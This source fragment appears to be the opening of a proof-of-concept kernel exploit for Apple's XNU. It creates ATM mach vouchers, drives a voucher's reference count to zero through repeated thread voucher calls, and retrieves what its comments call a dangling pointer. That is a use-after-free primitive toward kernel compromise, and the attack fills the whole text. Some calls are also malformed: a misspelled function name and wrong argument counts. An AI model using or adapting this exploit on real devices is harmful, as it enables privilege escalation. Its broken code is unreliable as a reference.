int main(int argc, char * argv[]) {
@autoreleasepool {
		mach_voucher_attr_recipe_data_t atm_data = {
			.key = MACH_VOUCHER_ATTR_KEY_ATM,
			.command = 510 //MACH_VOUCHER_ATTR_ATM_CREATE
	};
	
	mach_port_t p1 = MACH_PORT_NULL;
	int err = 0;
	err = host_create_mach_voucher_(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data,
		sizeof(atm_data), &p1);
		
	mach_port_t p2 = MACH_PORT_NULL;
	err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data,
		sizeof(atm_data), &p2);
		
	mach_port_t p3 = MACH_PORT_NULL;
	err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data,
		sizeof(atm_data), &p3);
		
	mach_port_t p4 = MACH_PORT_NULL;
	err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data,
		sizeof(atm_data), &p4);
		
	err = thread_set_mach_voucher(mach_thread_self(), p1); // 1 + 1 = 2
	
	err = thread_set_mach_voucher(mach_thread_self(), p1, &p2); // 2 - 1 = 1
	
	err = thread_set_mach_voucher(mach_thread_self(), p1, &p3); // 1 - 1 = 0 free
	
	mach_port_t real_port_to_fake_voucher = MACH_PORT_NULL;
	
	err = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher); //get the dangling pointer